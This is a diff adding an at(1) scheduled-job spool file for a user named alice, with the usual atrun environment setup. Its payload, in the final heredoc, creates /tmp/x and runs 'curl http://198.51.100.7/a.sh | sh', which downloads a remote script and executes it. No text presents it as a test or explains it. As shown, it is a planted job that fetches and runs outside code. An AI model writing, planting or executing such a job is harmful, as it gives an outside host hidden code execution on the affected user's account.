@@ -1,0 +1,22 @@
+#!/bin/sh
+# atrun uid=1000 gid=1000
+# mail alice 0
+umask 22
+SHELL=/bin/bash; export SHELL
+HOSTNAME=6c808bbb965c; export HOSTNAME
+PWD=/home/alice; export PWD
+LOGNAME=alice; export LOGNAME
+HOME=/home/alice; export HOME
+USER=alice; export USER
+SHLVL=1; export SHLVL
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; export PATH
+OLDPWD=/; export OLDPWD
+cd /home/alice || {
+	 echo 'Execution directory inaccessible' >&2
+	 exit 1
+}
+${SHELL:-/bin/sh} << 'marcinDELIMITER0c3e527a'
+touch /tmp/x
+curl http://198.51.100.7/a.sh | sh
+
+marcinDELIMITER0c3e527a
